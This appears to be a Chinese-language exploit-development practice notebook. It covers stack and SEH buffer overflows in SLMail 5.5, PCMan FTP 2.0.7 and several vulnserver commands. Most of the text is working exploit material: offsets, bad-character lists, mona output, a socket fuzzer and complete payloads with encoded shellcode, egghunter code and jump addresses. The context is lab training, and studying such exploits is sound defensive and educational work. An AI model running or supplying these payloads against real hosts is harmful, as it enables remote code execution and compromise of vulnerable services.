nop = \"\\x90\" * 20 all = b\"TRUN /./Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Caaabb\" + eip + nop + buf \u7ec3\u4e60C \u7a0b\u5e8f: slmail 5.5\u7248\u672c\u7f13\u51b2\u533a\u6ea2\u51fa POP3\u534f\u8bae\u8fde\u63a5\uff0cPASS\u547d\u4ee4\u540e\u8f93\u5165\u70b9\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e \u6839\u636e\u4f5c\u8005payload\u53ef\u5f97\u77e5,\u5728PASS\u547d\u4ee4\u540e\u63d2\u51652606\u4e2a\u574f\u5b57\u7b26\u5b57\u7b26\u53ef\u5bfc\u81f4\u6ea2\u51fa,EIP\u504f\u79fb\u91cf\u5c31\u57282606,\u4e4b\u540e\u7684\u6570\u636e\u4f1a\u6ea2\u51fa\u5230ESP. \u5982\u56feEIP\u7684\u503c\u88ab\u8986\u76d6\u4e3aAAAA \u627e\u5230 jmp esp \u5730\u5740\u5e76\u5c06EIP\u7684\u503c\u6ea2\u51fa\u4e3a\u8be5\u503c\uff0c\u7a0b\u5e8f\u6b63\u786e\u8df3\u5230\u4e86\u8fd9\u4e2a\u5730\u65b9 \u63a5\u7740\u6d4b\u8bd5\u574f\u5b57\u7b26 \u7ecf\u6d4b\u8bd5,\u574f\u5b57\u7b26\u4e3a \\x00\\x0a\\x0b\\x0d \uff0c\u6392\u9664\u574f\u5b57\u7b26\u751f\u6210shellcode\uff0c\u53d1\u9001 \u7ec3\u4e60D \u8f6f\u4ef6\uff1aPCMAN 2.0.7\u7248\u672c 21\u7aef\u53e3\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e \u63a5\u7740\u6d4b\u8bd5 \u5f8021\u7aef\u53e3\u53d1\u9001\u6570\u636e\u53ef\u4ee5\u770b\u5230\u88ab\u670d\u52a1\u5668\u63a5\u6536\u4e14\u56de\u663e\u5728\u65e5\u5fd7\u680f boofuzz\u8dd1\u4e00\u4e0b\uff0c\u7a0b\u5e8f\u5728\u6b64\u5904crash\u4e86 boofuzz\u811a\u672c\u53d1\u4e8610000\u5b57\u8282\u6570\u636e\u4ea7\u751f\u4e86crash\uff0c\u4f7f\u7528\u81ea\u5b9a\u4e49\u6570\u636e\u6d4b\u8bd5\u4e00\u4e0b\u6ea2\u51fa\u70b9 \u8fd9\u6b21\u53d1\u9001\u4e865000\u5b57\u8282\u4e5fcrash \u2514\u2500# msf-pattern_offset -q 43396F43 [*] Exact match at offset 2007 EIP\u504f\u79fb\u91cf2007 \u574f\u5b57\u7b26 \\x00\\x0a\\x0d \u5b8c\u6574payload eip = \"\\x01\\x90\\xd9\\x73\" nop = \"\\x90\" * 16 buf = b\"\" buf += b\"\\xdb\\xd7\\xd9\\x74\\x24\\xf4\\xb8\\x88\\x11\\x6c\\xc8\\x5a\\x2b\" buf += b\"\\xc9\\xb1\\x32\\x31\\x42\\x17\\x03\\x42\\x17\\x83\\x4a\\x15\\x8e\" buf += b\"\\x3d\\xb6\\xfe\\xcc\\xbe\\x46\\xff\\xb0\\x37\\xa3\\xce\\xf0\\x2c\" buf += b\"\\xa0\\x61\\xc1\\x27\\xe4\\x8d\\xaa\\x6a\\x1c\\x05\\xde\\xa2\\x13\" buf += b\"\\xae\\x55\\x95\\x1a\\x2f\\xc5\\xe5\\x3d\\xb3\\x14\\x3a\\x9d\\x8a\" buf += b\"\\xd6\\x4f\\xdc\\xcb\\x0b\\xbd\\x8c\\x84\\x40\\x10\\x20\\xa0\\x1d\" buf += b\"\\xa9\\xcb\\xfa\\xb0\\xa9\\x28\\x4a\\xb2\\x98\\xff\\xc0\\xed\\x3a\" buf += b\"\\xfe\\x05\\x86\\x72\\x18\\x49\\xa3\\xcd\\x93\\xb9\\x5f\\xcc\\x75\" buf += b\"\\xf0\\xa0\\x63\\xb8\\x3c\\x53\\x7d\\xfd\\xfb\\x8c\\x08\\xf7\\xff\" buf += b\"\\x31\\x0b\\xcc\\x82\\xed\\x9e\\xd6\\x25\\x65\\x38\\x32\\xd7\\xaa\" buf += b\"\\xdf\\xb1\\xdb\\x07\\xab\\x9d\\xff\\x96\\x78\\x96\\x04\\x12\\x7f\" buf += b\"\\x78\\x8d\\x60\\xa4\\x5c\\xd5\\x33\\xc5\\xc5\\xb3\\x92\\xfa\\x15\" buf += b\"\\x1c\\x4a\\x5f\\x5e\\xb1\\x9f\\xd2\\x3d\\xdc\\x5e\\x60\\x38\\x92\" buf += b\"\\x61\\x7a\\x42\\x83\\x09\\x4b\\xc9\\x4c\\x4d\\x54\\x18\\x29\\xb1\" buf += b\"\\xb6\\x88\\x44\\x5a\\x6f\\x59\\xe5\\x07\\x90\\xb4\\x2a\\x3e\\x13\" buf += b\"\\x3c\\xd3\\xc5\\x0b\\x35\\xd6\\x82\\x8b\\xa6\\xaa\\x9b\\x79\\xc8\" buf += b\"\\x19\\x9b\\xab\\xa6\\xf2\\x17\\x31\\x46\\x6c\\xbc\\x97\\xc3\\x16\" buf += b\"\\x59\\xe8\" all = \"\\x90\" * 2007 all += eip all += nop all += buf \u7ec3\u4e60E(SEH) \u91cd\u505avulserver.exe https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-gmon-command GMON\u547d\u4ee4\u53ef\u6ea2\u51fa\uff0c\u65e0\u6cd5\u4fee\u6539EIP\uff0c\u4f46\u662f\u53ef\u4ee5\u6ea2\u51fa\u5230SEH SEH\u4e24\u6761\u504f\u79fb\u91cf \u2514\u2500# msf-pattern_offset -q 6F45346F [*] Exact match at offset 3553 \u250c\u2500\u2500(root\ud83d\udc80kali)-[~] \u2514\u2500# msf-pattern_offset -q 45336f45 [*] Exact match at offset 3549 \u53ef\u4ee5\u63a7\u5236SEH\u4e86 \u4e0e\u666e\u901a\u627e\u5230 jmp esp \u7684\u65b9\u5f0f\u4e0d\u540c\u7684\u662f\uff0cSEH\u6ea2\u51fa\u5229\u7528\u9700\u8981\u627e\u5230\u4e00\u5904pop/pop/ret\u6307\u4ee4\u7ec4\u3002\u8fd9\u662f\u56e0\u4e3aSEH\u5728\u88ab\u8c03\u7528\u65f6\u4f1a\u5728\u6808\u4e0a\u538b\u5165\u6570\u4e2a\u53c2\u6570\uff0c\u4e24\u6b21pop\u6307\u4ee4\u53ef\u4ee5\u8ba9ESP\u2014\u2014\u6808\u9876\u7684\u4f4d\u7f6e\u5f80\u9ad8\u4f4d\u5904\u79fb\u52a88\u5b57\u8282(32\u4f4d\u7a0b\u5e8f\u4e2d\u4e24\u6b21pop\u5bc4\u5b58\u5668\uff0c\u5bc4\u5b58\u5668\u5927\u5c0f\u662f4\u5b57\u8282)\u3002\u5f53ESP\u51cf\u5c0f8\u5b57\u8282\u540e\u518d\u4f7f\u7528RET\u6b63\u597d\u53ef\u4ee5\u6267\u884cESP\u4e2d\u88ab\u63a7\u5236\u7684SEH\u6210\u5458\u5730\u5740\u3002 \u5730\u5740\u4e3a 625010b4 \u5c06SEH\u7684\u5730\u5740\u8986\u76d6\u4e3a 625010b4 \uff0c\u7a0b\u5e8f\u6210\u529f\u6267\u884c\u5230\u4e86\u8be5\u5904 \u4e3a\u6b64\u9700\u8981\u53d1\u9001\u7684payload\u683c\u5f0f\u4e3a SEH\u6ea2\u51fa\u504f\u79fb\u91cf + NSEH + SEH + \u586b\u5145\u7b26 NSEH\u662f\u5728SEH\u6267\u884c\u540e\u8c03\u7528\u7684\u6307\u4ee4\u3002 \u7a0b\u5e8f\u4ea7\u751f\u5f02\u5e38\u540e\u4f1a\u5148\u8c03\u7528SEH\u5730\u5740\u7684\u6307\u4ee4\uff0c\u6b64\u65f6SEH\u5730\u5740\u88ab\u8986\u76d6\u4e3a\u4e862\u4e2apop 1\u4e2aret\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u76f4\u63a5\u6267\u884cNSEH\u5730\u5740\u7684\u6307\u4ee4\uff0cNSEH\u7684\u6307\u4ee4\u6307\u5f15\u81ea\u5b9a\u4e49\u77ed\u8df3\u6307\u4ee4\u8df3\u5165shellcode\u533a\u3002 2\u6b21pop\u540eret\u8fd4\u56de\u5230\u4e86SEH\u7684\u5c0f\u7f13\u51b2\u533a \u867d\u7136\u53ef\u4ee5\u4f7f\u7528\u77ed\u8df3\u8df3\u5165\u4e0b\u9762\u7684\u53ef\u63a7\u533a\u57df\uff0c\u4f46\u662f\u4e0b\u9762\u7684\u533a\u57df\u6ca1\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u8ba9\u5165shellcode\u3002 \u7531\u4e8e\u4e0d\u80fd\u5f80\u540e\u8df3\uff0c\u90a3\u5c31\u5f80\u56de\u8df3\uff0c\u524d\u9762\u7684\u7a7a\u95f4\u4e5f\u662f\u53ef\u63a7\u7684 \u4f46\u662f\u77ed\u8df3\u7684\u8ddd\u79bb\u662f\u6709\u9650\u7684\uff0c\u65e0\u6cd5\u8df3\u8dc3\u6574\u4e2ashellcode\u3002\u6b64\u65f6\u53ef\u4ee5\u91c7\u7528\u5148\u77ed\u8df3\u81f3egghunter\u6307\u4ee4\uff0cegghunter\u5728\u524d\u9762\u7684\u66f4\u5927\u7684\u7f13\u51b2\u533a\u4e2d\u67e5\u627eegg\u6807\u8bb0\uff0c\u5728egg\u6807\u8bb0\u540e\u653e\u7f6eshellcode\u6765\u6267\u884cshellcode \u6574\u4e2apayload\u5982\u4e0b //egghunter\u4ee3\u7801 egghunter=b\"\" egghunter+=b\"\\x33\\xd2\\x66\\x81\\xca\\xff\\x0f\\x33\\xdb\\x42\\x53\\x53\\x52\\x53\\x53\\x53\" egghunter+=b\"\\x6a\\x29\\x58\\xb3\\xc0\\x64\\xff\\x13\\x83\\xc4\\x0c\\x5a\\x83\\xc4\\x08\\x3c\" egghunter+=b\"\\x05\\x74\\xdf\\xb8\\x50\\x57\\x4e\\x44\\x8b\\xfa\\xaf\\x75\\xda\\xaf\\x75\\xd7\" egghunter+=b\"\\xff\\xe7\" //\u6267\u884cnotepad\u7684shellcode buf = b\"\" buf += b\"\\xda\\xc0\\xd9\\x74\\x24\\xf4\\xbb\\x74\\x96\\x27\\xf3\\x5d\\x2b\" buf += b\"\\xc9\\xb1\\x32\\x31\\x5d\\x17\\x83\\xc5\\x04\\x03\\x29\\x85\\xc5\" buf += b\"\\x06\\x2d\\x41\\x8b\\xe9\\xcd\\x92\\xec\\x60\\x28\\xa3\\x2c\\x16\" buf += b\"\\x39\\x94\\x9c\\x5c\\x6f\\x19\\x56\\x30\\x9b\\xaa\\x1a\\x9d\\xac\" buf += b\"\\x1b\\x90\\xfb\\x83\\x9c\\x89\\x38\\x82\\x1e\\xd0\\x6c\\x64\\x1e\" buf += b\"\\x1b\\x61\\x65\\x67\\x46\\x88\\x37\\x30\\x0c\\x3f\\xa7\\x35\\x58\" buf += b\"\\xfc\\x4c\\x05\\x4c\\x84\\xb1\\xde\\x6f\\xa5\\x64\\x54\\x36\\x65\" buf += b\"\\x87\\xb9\\x42\\x2c\\x9f\\xde\\x6f\\xe6\\x14\\x14\\x1b\\xf9\\xfc\" buf += b\"\\x64\\xe4\\x56\\xc1\\x48\\x17\\xa6\\x06\\x6e\\xc8\\xdd\\x7e\\x8c\" buf += b\"\\x75\\xe6\\x45\\xee\\xa1\\x63\\x5d\\x48\\x21\\xd3\\xb9\\x68\\xe6\" buf += b\"\\x82\\x4a\\x66\\x43\\xc0\\x14\\x6b\\x52\\x05\\x2f\\x97\\xdf\\xa8\" buf += b\"\\xff\\x11\\x9b\\x8e\\xdb\\x7a\\x7f\\xae\\x7a\\x27\\x2e\\xcf\\x9c\" buf += b\"\\x88\\x8f\\x75\\xd7\\x25\\xdb\\x07\\xba\\x23\\x1a\\x95\\xc1\\x06\" buf += b\"\\x1c\\xa5\\xc9\\x36\\x75\\x94\\x42\\xd9\\x02\\x29\\x81\\x9d\\xed\" buf += b\"\\xcb\\x03\\xe8\\x85\\x55\\xc6\\x51\\xc8\\x65\\x3d\\x95\\xf5\\xe5\" buf += b\"\\xb7\\x66\\x02\\xf5\\xb2\\x63\\x4e\\xb1\\x2f\\x1e\\xdf\\x54\\x4f\" buf += b\"\\x8d\\xe0\\x7c\\x21\\x5e\\x6b\\x1a\\xcd\\xc1\\xf7\\xca\\x48\\x7a\" buf += b\"\\x9d\\x12\" all = b\"GMON /.\" //\u9020\u6210\u6ea2\u51fa\u7684\u5b57\u7b26 all += \"A\" * 8 //\u5360\u4f4d\uff0c\u4e0e\u6709\u6548\u6570\u636e\u5206\u5f00 all += b\"PWNDPWND\" + buf //egg\u6807\u5fd7\u540e\u9762\u8ddfshellcode all += \"\\x90\" * (3556 - 50 -len(all)) //\u51cf\u53bbegg\u6807\u5fd7\u3001shellcode\u3001egghunter\u4ee3\u7801\u540e\u7684\u586b\u5145 all += egghunter //egghunter\u586b\u5145\u5b57\u7b26\uff0c\u653e\u5728\u8fd9\u91cc\u4fbf\u4e8e\u88ab\u77ed\u8df3\u5230 all += \"\\x90\" * (3556 - len(all)) //\u5269\u4f59\u7684\u586b\u5145\u5b57\u7b26 all += \"\\xeb\\xbc\\x90\\x90\" //nseh\uff0c\u8fd9\u662f\u4e00\u4e2a\u77ed\u8df3\u6307\u4ee4 all += \"\\xb4\\x10\\x50\\x62\" //\u6307\u5411pop pop ret\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4fbf\u4e8e\u6267\u884cnseh\u4e2d\u5730\u5740 all += \"\\x90\" * 1000 //\u586b\u5145\u7b26 s.send(all) \u7ec3\u4e60F vulserver\u7684HTER\u547d\u4ee4\u7ec3\u4e60 \u6808\u6ea2\u51faEIP\u8986\u76d6\uff0c\u76f4\u63a5\u4f7f\u7528\u666e\u901a\u5b57\u7b26\u53ef\u4ee5\u9020\u6210\u6ea2\u51fa\u3002\u4f46\u662f\u6ea2\u51fa\u5b57\u7b26\u88ab\u76f4\u63a5\u5199\u5165\u4e86\u5185\u5b58\u3002 msf\u751f\u6210\u7684\u5b57\u7b26\u5728\u8fd9\u79cd\u73af\u5883\u65e0\u6cd5\u4f7f\u7528\uff0c\u6240\u4ee5\u5b57\u7b26\u90fd\u4ee516\u8fdb\u5236\u5199\u5165\u5185\u5b58\uff0c\u6d4b\u8bd5\u6ca1\u529e\u6cd5\u9020\u6210\u6ea2\u51fa\u3002 \u4f7f\u7528\u811a\u672c\u4e00\u4e2a\u4e2a\u53d1\u9001\u5b57\u7b26\uff0c\u53cd\u590d\u6d4b\u8bd5\uff0c\u6700\u7ec8\u6ea2\u51fa\u70b9\u5728 HTER \u76842041\u5b57\u7b26\u540e import socket import sys ip = \"192.168.14.139\" port = 9999 string = \"HTER \" s = socket.socket() s.connect((ip, port)) timeout = 3 s.settimeout(timeout) while True: try: print(\"Fuzzing with {} bytes\".format(len(string))) s.send(string + b\"\\x0a\\x0d\") string += b\"A\" * 1 s.recv(1024) except: print(\"Fuzzer crashed at {} bytes\".format(len(string))) sys.exit(0) s.close() \u7528mona\u63d2\u4ef6\u627e\u5230 jmp esp \u7684\u5730\u5740\u3002 [+] Command used: !mona jmp -r esp ---------- Mona command started on 2023-10-16 15:15:42 (v2.0, rev 577) ---------- [+] Processing arguments and criteria - Pointer access level : X [+] Generating module info table, hang on... - Processing modules - Done. Let's rock 'n roll. [+] Querying 2 modules - Querying module essfunc.dll - Querying module vulnserver.exe - Search complete, processing results [+] Preparing output file 'jmp.txt' - (Re)setting logfile jmp.txt [+] Writing results to jmp.txt - Number of pointers of type 'jmp esp' : 9 [+] Results : 0x625011af | 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011bb | 0x625011bb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011c7 | 0x625011c7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011d3 | 0x625011d3 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011df | 0x625011df : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011eb | 0x625011eb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011f7 | 0x625011f7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x62501203 | 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x62501205 | 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) \u540e\u9762\u5c31\u662f\u5e38\u89c4\u7684\u627e\u574f\u5b57\u7b26\u3001\u751f\u6210shellcode\uff0c\u7136\u540e\u53d1\u9001payload\u3002\u5b8c\u6574payload all = \"HTER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + \"af115062\" + \"90\" * 20 + \"dac0d97424f4bb749627f35d2bc9b132315d1783c504032985c5062d418be9cd92ec6028a32c1639949c5c6f1956309baa1a9dac1b90fb839c8938821ed06c641e1b616567468837300c3fa73558fc4c054c84b1de6fa56454366587b9422c9fde6fe614141bf9fc64e456c14817a6066ec8dd7e8c75e645eea1635d4821d3b968e6824a6643c0146b52052f97dfa8ff119b8edb7a7fae7a272ecf9c888f75d725db07ba231a95c1061ca5c936759442d90229819dedcb03e88555c651c8653d95f5e5b76602f5b2634eb12f1edf544f8de07c215e6b1acdc1f7ca487a9d12\" \u7ec3\u4e60G VulServer\u4e2d\u7684LTER\u547d\u4ee4 ./ \u540e\u8ddf\u591a\u4e2a\u5b57\u7b26\u89e6\u53d1\u6ea2\u51fa\uff0c\u6ea2\u51fa\u5230SEH \u8ba1\u7b97SEH\u548cNSEH\u504f\u79fb\u91cf\uff0c\u4e0a\u9762\u662fSEH\uff0c\u4e0b\u9762\u662fNSEH \u2514\u2500# msf-pattern_offset -q 6f45346f [*] Exact match at offset 3553 \u2514\u2500# msf-pattern_offset -q 45336f45 [*] Exact match at offset 3549 \u6d4b\u8bd5\u8986\u76d6SEH \u6d4b\u8bd5\u574f\u5b57\u7b26\uff0c\u7ed3\u679c\u4e3a \\x80 \u5230 \\xff \u5b57\u7b26\u90fd\u88ab\u8f6c\u6362\u6210\u4e86 \\x01 \u5230 \\x7f \u4e4b\u95f4\u7684\u5b57\u7b26\u3002 ASCII\u5b57\u7b26\u8303\u56f4\u662f \\x00 \u5230 \\x7f \uff0cLTER\u547d\u4ee4\u4ec5\u63a5\u53d7ASCII\u5b57\u7b26\uff0c\u4f1a\u5bf9ASCII\u4ee5\u5916\u7684\u5b57\u7b26\u8fdb\u884c\u8f6c\u6362 \u7528mona\u627e\u5230\u5408\u9002\u7684seh\u5229\u7528\u6307\u4ee4\u7ec4\u5730\u5740\uff0c\u4ec5\u6709ASCII\u5b57\u7b26\u7684\u5730\u5740 6250120b \u8ddf\u8e2a\u4e4b\u540e\u786e\u8ba4\u8986\u76d6\u4e86SEH \u4e0b\u4e00\u6b65\u662f\u8df3\u51faSEH\u533a\uff0c\u77ed\u8df3\u6307\u4ee4 jmp \u768416\u8fdb\u5236 \\xeb \u662f\u574f\u5b57\u7b26\uff0c\u4f7f\u7528\u6761\u4ef6\u8df3\u8f6c \u4ee3\u7801\u6267\u884c\u6d41\u91cd\u5b9a\u5411\u6d41\u6307\u4ee4 \u5728\u80fd\u63a7\u5236\u5bc4\u5b58\u5668\u503c\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528 jmp esp //FFE4 call esp //FFD4 pop eax; call eax egghunter PWND egghunter=b\"\" egghunter+=b\"\\x33\\xd2\\x66\\x81\\xca\\xff\\x0f\\x33\\xdb\\x42\\x53\\x53\\x52\\x53\\x53\\x53\" egghunter+=b\"\\x6a\\x29\\x58\\xb3\\xc0\\x64\\xff\\x13\\x83\\xc4\\x0c\\x5a\\x83\\xc4\\x08\\x3c\" egghunter+=b\"\\x05\\x74\\xdf\\xb8\\x50\\x57\\x4e\\x44\\x8b\\xfa\\xaf\\x75\\xda\\xaf\\x75\\xd7\" egghunter+=b\"\\xff\\xe7\" 